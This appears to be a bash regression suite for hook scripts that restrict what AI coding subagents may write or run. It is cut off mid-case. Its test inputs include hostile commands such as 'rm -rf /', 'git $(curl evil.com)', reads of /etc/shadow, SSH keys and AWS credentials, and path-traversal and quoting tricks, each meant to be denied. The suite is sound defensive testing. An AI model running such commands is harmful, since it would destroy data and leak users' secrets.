#!/usr/bin/env bash
# Regression suite for hook-pm-write-guard.sh and hook-codex-bash-guard.sh.
#
# Runs each hook script with a stdin payload that simulates the PreToolUse JSON
# Claude Code emits, asserts the exit code, optionally checks for a substring in
# stderr, and (on selected cases) asserts a substring in the audit log.
#
# Audit log is redirected to a per-run temp dir via $CLAUDE_HOOK_LOG_DIR — the
# live ~/.claude/logs/hooks.log is NOT polluted by this suite.
#
# Usage:
#   scripts/test-hooks.sh           # silent unless failures
#   VERBOSE=1 scripts/test-hooks.sh # print every case

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PMHOOK="$SCRIPT_DIR/hook-pm-write-guard.sh"
CXHOOK="$SCRIPT_DIR/hook-codex-bash-guard.sh"

# Sandbox audit logs.
export CLAUDE_HOOK_LOG_DIR="$(mktemp -d)"
TEST_LOG_FILE="$CLAUDE_HOOK_LOG_DIR/hooks.log"
trap 'rm -rf "$CLAUDE_HOOK_LOG_DIR"' EXIT

# Pin the codex-executor read roots to known values so path tests are
# deterministic regardless of caller environment.
export CLAUDE_HOOK_CODEX_READ_ROOTS="$HOME/github:/tmp"

PASS=0
FAIL=0
FAILED_CASES=()

# run_case <name> <expected_exit> <hook_path> <json_input> [<expected_stderr_substring>]
run_case() {
  local name="$1" expect_exit="$2" hook="$3" json="$4" expect_stderr="${5:-}"
  local stderr_file actual_exit actual_stderr
  stderr_file="$(mktemp)"
  printf '%s' "$json" | "$hook" 2>"$stderr_file"
  actual_exit=$?
  actual_stderr="$(cat "$stderr_file")"
  rm -f "$stderr_file"

  local pass=1
  if [[ "$actual_exit" != "$expect_exit" ]]; then pass=0; fi
  if [[ -n "$expect_stderr" && "$actual_stderr" != *"$expect_stderr"* ]]; then pass=0; fi

  if [[ "$pass" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
    printf '        expected: exit=%s' "$expect_exit"
    [[ -n "$expect_stderr" ]] && printf ' stderr~="%s"' "$expect_stderr"
    printf '\n        actual:   exit=%s' "$actual_exit"
    [[ -n "$actual_stderr" ]] && printf ' stderr=%q' "${actual_stderr:0:200}"
    printf '\n'
  fi
}

# run_case_env <name> <expected_exit> <env_var=value> <hook_path> <json_input>
run_case_env() {
  local name="$1" expect_exit="$2" envspec="$3" hook="$4" json="$5"
  local actual_exit
  actual_exit=$(printf '%s' "$json" | env "$envspec" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$hook" >/dev/null 2>&1; echo $?)
  if [[ "$actual_exit" == "$expect_exit" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (expected exit=%s, got exit=%s)\n' "$name" "$expect_exit" "$actual_exit"
  fi
}

# assert_log <name> <expected_substring>
# Asserts the test log file contains the substring SOMEWHERE in any line.
assert_log() {
  local name="$1" needle="$2"
  if [[ -f "$TEST_LOG_FILE" ]] && grep -q -F -- "$needle" "$TEST_LOG_FILE"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (log missing substring: %q)\n' "$name" "$needle"
  fi
}

# truncate_log — used between sub-suites so audit-content assertions are local.
truncate_log() { : > "$TEST_LOG_FILE"; }

mem_path='/home/screenleon/.claude/projects/-home-screenleon-github/memory/foo.md'
code_path='/home/screenleon/github/claude-config/agents/project-pm.md'

# =============================================================================
# pm-write-guard
# =============================================================================

echo "== hook-pm-write-guard =="

run_case "pm: Edit memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Write memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Edit code (outside memory) → deny" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" \
  "outside memory directory"

run_case "pm: Write to /tmp → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/oops.md"}}' \
  "outside memory directory"

run_case "pm: Edit memory/../../etc/passwd → deny (realpath normalizes)" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/home/screenleon/.claude/projects/-home-screenleon-github/memory/../../../etc/passwd"}}' \
  "outside memory directory"

run_case "pm: Edit memory-evil/x.md → deny (no prefix collision)" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/home/screenleon/.claude/projects/-home-screenleon-github/memory-evil/x.md"}}' \
  "outside memory directory"

run_case "pm: relative file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":"foo.md"}}' \
  "must be absolute"

run_case "pm: empty file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":""}}' \
  "empty"

run_case "pm: missing tool_input → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit"}' \
  "empty"

run_case "pm: malformed JSON → deny" 2 "$PMHOOK" \
  'not json at all' \
  "malformed JSON"

# Type confusion (qa medium): array-typed agent_type → no-op (jq -r returns
# the JSON-encoded string of the array, which won't equal "project-pm").
run_case "pm: agent_type as array → no-op" 0 "$PMHOOK" \
  "{\"agent_type\":[\"project-pm\"],\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case "pm: agent_type null → no-op" 0 "$PMHOOK" \
  "{\"agent_type\":null,\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case "pm: critic Edit anywhere → no-op (allow)" 0 "$PMHOOK" \
  '{"agent_type":"critic","tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: codex-executor Write anywhere → no-op" 0 "$PMHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: main thread (no agent_type) → no-op" 0 "$PMHOOK" \
  '{"tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: project-pm Bash → no-op (matcher would not fire it)" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"ls"}}'

run_case "pm: project-pm Read → no-op" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

run_case_env "pm: bypass via CLAUDE_HOOK_PM_GUARD=off" 0 "CLAUDE_HOOK_PM_GUARD=off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=Off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

# Audit-log content assertions for pm-guard.
truncate_log
printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}" | "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains allow line" "decision=allow"

truncate_log
printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" | "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains deny line with reason" "decision=deny"
assert_log "pm: audit log includes target file_path" "$code_path"

truncate_log
printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}" | env CLAUDE_HOOK_PM_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains bypass line with agent_type" "decision=bypass"
assert_log "pm: bypass line records project-pm (not '?')" "agent=project-pm"

# =============================================================================
# codex-bash-guard
# =============================================================================

echo
echo "== hook-codex-bash-guard =="
truncate_log

dispatch_abs="/home/screenleon/github/claude-config/scripts/codex-dispatch.sh"
dispatch_tilde='~/github/claude-config/scripts/codex-dispatch.sh'

# --- happy path ---
run_case "cx: dispatch (absolute) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_abs --cd /tmp -- brief\"}}"

run_case "cx: dispatch (tilde) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp -- brief\"}}"

run_case "cx: git status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git log → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --oneline -5"}}'

run_case "cx: git -C dir status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp status --short"}}'

run_case "cx: git -C dir diff --stat → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp diff --stat"}}'

run_case "cx: cat file under read root → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/trace.jsonl"}}'

run_case "cx: jq parse on read-root file → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq -r .type /tmp/trace.jsonl"}}'

run_case "cx: sleep 10 → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sleep 10"}}'

run_case "cx: pwd → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"pwd"}}'

run_case "cx: relative path under codex CWD → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat .agent-trace/latest.jsonl"}}'

# --- security: per-metachar isolated coverage ---
run_case "cx: SOLO ;  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; foo"}}' \
  "shell metacharacter"

run_case "cx: SOLO &  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status & sleep 1"}}' \
  "shell metacharacter"

run_case "cx: SOLO |  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status | sh"}}' \
  "shell metacharacter"

run_case "cx: SOLO \$  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo $HOME"}}' \
  "shell metacharacter"

run_case "cx: SOLO backtick → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo `whoami`"}}' \
  "shell metacharacter"

run_case "cx: SOLO ( → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo (foo"}}' \
  "shell metacharacter"

run_case "cx: SOLO ) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo foo)"}}' \
  "shell metacharacter"

run_case "cx: SOLO < (input redir) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat </tmp/x"}}' \
  "shell metacharacter"

run_case "cx: SOLO > (output redir) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status >/tmp/x"}}' \
  "shell metacharacter"

run_case "cx: SOLO { (brace expansion) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo {a,b}"}}' \
  "shell metacharacter"

run_case "cx: SOLO \\\\ (backslash) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo \\foo"}}' \
  "shell metacharacter"

# Newline / CR handled in distinct branches.
run_case "cx: command with newline → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /"}}' \
  "newline"

run_case "cx: command with CR → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\rrm -rf /"}}' \
  "carriage return"

# Composition aliases that combine multiple metachars; each previously demonstrated as bypass.
run_case "cx: git status; rm -rf / → deny (semicolon)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git status && rm -rf / → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status && rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git \$(curl evil) → deny (cmd subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git $(curl evil.com)"}}' \
  "shell metacharacter"

run_case "cx: cat <(...) → deny (process subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat <(cat /etc/passwd)"}}' \
  "shell metacharacter"

run_case "cx: cd /tmp && cmd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cd /tmp && git status"}}' \
  "shell metacharacter"

# --- security: exfiltration via read-only verbs (NEW v3) ---
run_case "cx: cat /etc/shadow → deny (outside read root)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/shadow"}}' \
  "outside read roots"

run_case "cx: cat /etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/passwd"}}' \
  "outside read roots"

run_case "cx: cat ~/.ssh/id_rsa → deny (tilde rejected)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' \
  "tilde path"

run_case "cx: cat /home/screenleon/.aws/credentials → deny (outside read root)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /home/screenleon/.aws/credentials"}}' \
  "outside read roots"

run_case "cx: grep secret /home/screenleon/.netrc → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep secret /home/screenleon/.netrc"}}' \
  "outside read roots"

run_case "cx: ls /home/screenleon/.config → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /home/screenleon/.config"}}' \
  "outside read roots"

# --- security: glob rejection ---
run_case "cx: cat * → deny (glob)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat *"}}' \
  "glob char in arg"

run_case "cx: cat /tmp/*.log → deny (glob)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/*.log"}}' \
  "glob char in arg"

run_case "cx: ls /home/?/.ssh → deny (?)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /home/?/.ssh"}}' \
  "glob char in arg"

run_case "cx: cat /tmp/[abc]/x → deny ([)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/[abc]/x"}}' \
  "glob char in arg"

# --- security: destructive git ---
run_case "cx: git push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
  "not in read-only allowlist"

run_case "cx: git push --force → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' \
  "not in read-only allowlist"

run_case "cx: git reset --hard → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git reset --hard"}}' \
  "not in read-only allowlist"

run_case "cx: git commit -am → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git commit -am msg"}}' \
  "not in read-only allowlist"

run_case "cx: git rebase main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git rebase main"}}' \
  "not in read-only allowlist"

run_case "cx: git checkout main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git checkout main"}}' \
  "not in read-only allowlist"

run_case "cx: git merge other → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git merge other"}}' \
  "not in read-only allowlist"

run_case "cx: git branch -D foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -D foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -d foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -a → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git branch --show-current → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch --show-current"}}'

# --- security: git stash subverbs (NEW v3) ---
run_case "cx: git stash list → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash list"}}'

run_case "cx: git stash show → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash show"}}'

run_case "cx: bare git stash → deny (mutating default)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash"}}' \
  "bare 'git stash' is mutating"

run_case "cx: git stash push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash push -m foo"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash drop → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash drop"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash pop → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash pop"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash clear → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash clear"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash apply → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash apply"}}' \
  "stash subverb not in read-only allowlist"

# --- security: --output / --out-file flag rejection (NEW v3) ---
run_case "cx: git log --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --output=/tmp/x"}}' \
  "git write flag"

run_case "cx: git diff --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git diff --output=/tmp/x"}}' \
  "git write flag"

run_case "cx: git show --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git show --output=/tmp/x"}}' \
  "git write flag"

# --- security: unsupported git option forms (NEW v3) ---
run_case "cx: git -c key=val status → deny (unsupported form)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -c key=val status"}}' \
  "unsupported git form"

run_case "cx: git --git-dir=foo status → deny (unsupported form)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git --git-dir=/tmp/x status"}}' \
  "unsupported git form"

# --- security: dangerous binaries off allowlist ---
run_case "cx: find . -delete → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -delete"}}' \
  "not in allowlist"

run_case "cx: find . -name foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -name foo"}}' \
  "not in allowlist"

run_case "cx: bash -c → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"bash -c whatever"}}' \
  "not in allowlist"

run_case "cx: sed -i → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sed -i s/a/b/ file"}}' \
  "not in allowlist"

run_case "cx: awk script → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"awk -f script.awk file"}}' \
  "not in allowlist"

run_case "cx: env FOO=x git status → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"env FOO=x git status"}}' \
  "not in allowlist"

run_case "cx: codex exec direct → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"codex exec foo"}}' \
  "not in allowlist"

# --- empty / malformed ---
run_case "cx: empty command → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":""}}' \
  "empty"

run_case "cx: malformed JSON → deny" 2 "$CXHOOK" \
  'not json' \
  "malformed JSON"

# --- type confusion ---
run_case "cx: agent_type as array → no-op" 0 "$CXHOOK" \
  '{"agent_type":["codex-executor"],"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: agent_type null → no-op" 0 "$CXHOOK" \
  '{"agent_type":null,"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- no-op for non-target agents/tools ---
run_case "cx: critic Bash → no-op" 0 "$CXHOOK" \
  '{"agent_type":"critic","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: project-pm Bash → no-op (other guard)" 0 "$CXHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: main thread (no agent_type) → no-op" 0 "$CXHOOK" \
  '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: codex-executor Read → no-op" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

# --- bypass env var ---
run_case_env "cx: bypass via CLAUDE_HOOK_CODEX_GUARD=off" 0 "CLAUDE_HOOK_CODEX_GUARD=off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=Off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- audit-log content assertions ---
truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}' | "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains allow line" "decision=allow"
# %q escapes spaces as backslash-space; assert the escaped form.
assert_log "cx: allow line records git command (escaped)" 'git\ status'

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' | "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains deny line" "decision=deny"
assert_log "cx: deny line records command target (escaped)" 'git\ push\ --force'

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' | "$CXHOOK" >/dev/null 2>&1
# Reason is also %q-escaped; the literal `shell` token survives unescaped.
assert_log "cx: deny reason includes 'shell metacharacter'" 'shell\ metacharacter'

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}' | env CLAUDE_HOOK_CODEX_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains bypass line with agent_type" "decision=bypass"
assert_log "cx: bypass line records codex-executor (not '?')" "agent=codex-executor"

# --- read-root override via env var ---
run_case_env "cx: cat /etc/x with /etc in read roots → allow" 0 "CLAUDE_HOOK_CODEX_READ_ROOTS=/etc" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/passwd"}}'

# --- v4: quoted-path bypass ---
run_case 'cx: cat "/etc/passwd" (double-quote) → deny' 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat \"/etc/passwd\""}}' \
  "double-quote"

run_case "cx: cat '/etc/passwd' (single-quote) → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cat '/etc/passwd'\"}}" \
  "single-quote"

run_case 'cx: grep "pattern" file (any double-quote) → deny' 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep \"pattern\" file"}}' \
  "double-quote"

# --- v4: relative `..` traversal bypass ---
run_case "cx: cat ../etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ../etc/passwd"}}' \
  "path traversal"

run_case "cx: cat ../../etc/shadow → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ../../etc/shadow"}}' \
  "path traversal"

run_case "cx: cat ./../etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ./../etc/passwd"}}' \
  "path traversal"

run_case "cx: cat foo/../bar → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat foo/../bar"}}' \
  "path traversal"

run_case "cx: legitimate filename foo..bar → allow (not path segment)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat foo..bar"}}'

# --- v4: git -C dir read-root validation ---
run_case "cx: git -C /etc status → deny (outside read roots)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /etc status"}}' \
  "git -C dir outside read roots"

run_case "cx: git -C /home/screenleon/.ssh status → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /home/screenleon/.ssh status"}}' \
  "git -C dir outside read roots"

run_case "cx: git -C /tmp/../etc status → deny (traversal normalizes)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp/../etc status"}}' \
  "path traversal"

run_case "cx: git -C ../foo status → deny (relative traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C ../foo status"}}' \
  "path traversal"

# --- v4: --flag=PATH bypass ---
run_case "cx: grep --file=/etc/shadow x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: jq --slurpfile=/etc/passwd . → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq --slurpfile=/etc/passwd ."}}' \
  "outside read roots"

run_case "cx: cat --include=/tmp/foo file → allow (value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat --include=/tmp/foo file"}}'

run_case "cx: grep --file=~/.ssh/x file → deny (tilde in flag value)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=~/.ssh/x file"}}' \
  "tilde path"

run_case "cx: grep --file=/tmp/../etc/passwd → deny (traversal in flag value)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=/tmp/../etc/passwd file"}}' \
  "path traversal"

# --- v5: short-flag bypass (single-dash with =, bundled with attached path) ---
run_case "cx: grep -f=/etc/shadow x → deny (short flag with =)" 2 "$CXHOOK" \
